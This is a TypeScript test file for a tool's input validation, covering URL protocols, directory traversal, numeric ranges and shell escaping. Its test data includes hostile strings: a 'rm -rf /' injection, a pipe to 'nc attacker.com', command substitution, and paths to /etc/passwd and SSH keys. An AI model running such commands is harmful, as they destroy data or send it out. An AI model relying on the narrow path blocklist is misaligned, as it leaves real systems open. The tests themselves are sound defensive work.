/**
 * Input Validation and Sanitization Tests
 *
 * Tests for Task 12.2: Input validation and sanitization
 * - URL format validation (HTTP/HTTPS only, no file:// or ftp://)
 * - File path sanitization to prevent directory traversal
 * - Numeric range validation (concurrency > 0, duration >= 10s)
 * - Shell argument escaping for external process execution
 */

import { describe, it, expect } from 'vitest';

describe('Input Validation', () => {
  describe('URL Validation', () => {
    it('should accept valid HTTPS URLs', () => {
      const validUrls = [
        'https://api.example.com',
        'https://api.example.com/v1',
        'https://api.example.com:8443/path',
        'https://subdomain.example.com',
      ];

      validUrls.forEach(url => {
        const result = validateUrl(url);
        expect(result.valid).toBe(true);
        expect(result.error).toBeUndefined();
      });
    });

    it('should accept valid HTTP URLs', () => {
      const validUrls = [
        'http://localhost:8080',
        'http://127.0.0.1:3000',
        'http://api.example.com',
      ];

      validUrls.forEach(url => {
        const result = validateUrl(url);
        expect(result.valid).toBe(true);
        expect(result.error).toBeUndefined();
      });
    });

    it('should reject file:// URLs', () => {
      const invalidUrls = [
        'file:///etc/passwd',
        'file://C:/Windows/System32',
        'file:///home/user/secret.txt',
      ];

      invalidUrls.forEach(url => {
        const result = validateUrl(url);
        expect(result.valid).toBe(false);
        expect(result.error).toContain('file:// protocol');
      });
    });

    it('should reject ftp:// URLs', () => {
      const invalidUrls = [
        'ftp://ftp.example.com',
        'ftps://secure.example.com',
      ];

      invalidUrls.forEach(url => {
        const result = validateUrl(url);
        expect(result.valid).toBe(false);
        expect(result.error).toContain('Only HTTP and HTTPS');
      });
    });

    it('should reject malformed URLs', () => {
      const invalidUrls = [
        'not-a-url',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        '//example.com',
        'htp://typo.com',
      ];

      invalidUrls.forEach(url => {
        const result = validateUrl(url);
        expect(result.valid).toBe(false);
        expect(result.error).toBeDefined();
      });
    });
  });

  describe('File Path Sanitization', () => {
    it('should reject directory traversal attempts', () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        'reports/../../etc/passwd',
        './../../../secret.txt',
      ];

      maliciousPaths.forEach(path => {
        const result = sanitizeFilePath(path);
        expect(result.safe).toBe(false);
        expect(result.error).toContain('directory traversal');
      });
    });

    it('should accept safe relative paths', () => {
      const safePaths = [
        'reports/study-123.json',
        'checkpoints/checkpoint.json',
        'templates/report.hbs',
        'study-results/analysis.md',
      ];

      safePaths.forEach(path => {
        const result = sanitizeFilePath(path);
        expect(result.safe).toBe(true);
        expect(result.sanitized).toBeDefined();
        expect(result.error).toBeUndefined();
      });
    });

    it('should normalize safe paths', () => {
      const path = 'reports//study-123.json';
      const result = sanitizeFilePath(path);

      expect(result.safe).toBe(true);
      expect(result.sanitized).toBe('reports/study-123.json');
    });

    it('should reject absolute paths to sensitive directories', () => {
      const sensitivePaths = [
        '/etc/passwd',
        '/root/.ssh/id_rsa',
        'C:\\Windows\\System32\\config\\SAM',
        '/var/log/auth.log',
      ];

      sensitivePaths.forEach(path => {
        const result = sanitizeFilePath(path);
        expect(result.safe).toBe(false);
        expect(result.error).toContain('absolute path');
      });
    });
  });

  describe('Numeric Range Validation', () => {
    it('should validate concurrency is greater than 0', () => {
      const validValues = [1, 10, 50, 100, 1000];

      validValues.forEach(value => {
        const result = validateConcurrency(value);
        expect(result.valid).toBe(true);
        expect(result.error).toBeUndefined();
      });
    });

    it('should reject concurrency of 0 or negative', () => {
      const invalidValues = [0, -1, -10];

      invalidValues.forEach(value => {
        const result = validateConcurrency(value);
        expect(result.valid).toBe(false);
        expect(result.error).toContain('greater than 0');
      });
    });

    it('should validate duration is at least 10 seconds', () => {
      const validDurations = [10, 30, 60, 120, 300];

      validDurations.forEach(duration => {
        const result = validateDuration(duration);
        expect(result.valid).toBe(true);
        expect(result.error).toBeUndefined();
      });
    });

    it('should reject duration less than 10 seconds', () => {
      const invalidDurations = [0, 5, 9];

      invalidDurations.forEach(duration => {
        const result = validateDuration(duration);
        expect(result.valid).toBe(false);
        expect(result.error).toContain('at least 10 seconds');
      });
    });

    it('should reject non-integer numeric values', () => {
      const nonIntegers = [1.5, 10.7, NaN, Infinity];

      nonIntegers.forEach(value => {
        const concurrencyResult = validateConcurrency(value);
        expect(concurrencyResult.valid).toBe(false);

        const durationResult = validateDuration(value);
        expect(durationResult.valid).toBe(false);
      });
    });
  });

  describe('Shell Argument Escaping', () => {
    it('should escape shell special characters', () => {
      const dangerousArgs = [
        'file; rm -rf /',
        'file && malicious-command',
        'file | nc attacker.com 1234',
        'file`whoami`',
        'file$(whoami)',
      ];

      dangerousArgs.forEach(arg => {
        const escaped = escapeShellArg(arg);

        // Should be properly quoted (wrapping in quotes neutralizes special chars)
        expect(escaped.startsWith("'")).toBe(true);
        expect(escaped.endsWith("'")).toBe(true);

        // Original dangerous argument should be wrapped, not modified
        expect(escaped).toContain(arg.replace(/'/g, "'\\''"));
      });
    });

    it('should handle file paths with spaces', () => {
      const paths = [
        '/path/with spaces/file.txt',
        'C:\\Program Files\\JMeter\\bin\\jmeter.bat',
        'my file.txt',
      ];

      paths.forEach(path => {
        const escaped = escapeShellArg(path);

        // Should be quoted to preserve spaces
        expect(escaped.startsWith("'") || escaped.startsWith('"')).toBe(true);
      });
    });

    it('should escape arguments for safe execution', () => {
      const args = [
        '--config=study.yaml',
        '--output=/tmp/results',
        '--flag',
      ];

      args.forEach(arg => {
        const escaped = escapeShellArg(arg);

        // Safe arguments might not need escaping, but should be validated
        expect(escaped).toBeDefined();
        expect(typeof escaped).toBe('string');
      });
    });
  });
});

// Validation function implementations
interface ValidationResult {
  valid: boolean;
  error?: string;
}

interface SanitizationResult {
  safe: boolean;
  sanitized?: string;
  error?: string;
}

function validateUrl(url: string): ValidationResult {
  try {
    const parsed = new URL(url);

    // Only allow HTTP and HTTPS
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
      if (parsed.protocol === 'file:') {
        return {
          valid: false,
          error: 'file:// protocol is not allowed for security reasons'
        };
      }
      return {
        valid: false,
        error: 'Only HTTP and HTTPS protocols are allowed'
      };
    }

    return { valid: true };
  } catch (error) {
    return {
      valid: false,
      error: 'Invalid URL format'
    };
  }
}

function sanitizeFilePath(path: string): SanitizationResult {
  // Check for directory traversal patterns
  if (path.includes('..')) {
    return {
      safe: false,
      error: 'Path contains directory traversal pattern (..)'
    };
  }

  // Reject absolute paths to sensitive system directories
  const sensitivePatterns = [
    /^\/etc\//,
    /^\/root\//,
    /^\/var\/log\//,
    /^C:\\Windows\\/i,
    /^\/System\//,
  ];

  for (const pattern of sensitivePatterns) {
    if (pattern.test(path)) {
      return {
        safe: false,
        error: 'absolute path to sensitive directory not allowed'
      };
    }
  }

  // Normalize path (remove duplicate slashes, etc.)
  const normalized = path.replace(/\/+/g, '/');

  return {
    safe: true,
    sanitized: normalized
  };
}

function validateConcurrency(value: number): ValidationResult {
  if (!Number.isInteger(value)) {
    return {
      valid: false,
      error: 'Concurrency must be an integer'
    };
  }

  if (value <= 0) {
    return {
      valid: false,
      error: 'Concurrency must be greater than 0'
    };
  }

  return { valid: true };
}

function validateDuration(value: number): ValidationResult {
  if (!Number.isInteger(value)) {
    return {
      valid: false,
      error: 'Duration must be an integer'
    };
  }

  if (value < 10) {
    return {
      valid: false,
      error: 'Duration must be at least 10 seconds'
    };
  }

  return { valid: true };
}

function escapeShellArg(arg: string): string {
  // Wrap in single quotes and escape any single quotes in the string
  // This prevents shell interpretation of special characters
  return `'${arg.replace(/'/g, "'\\''")}'`;
}
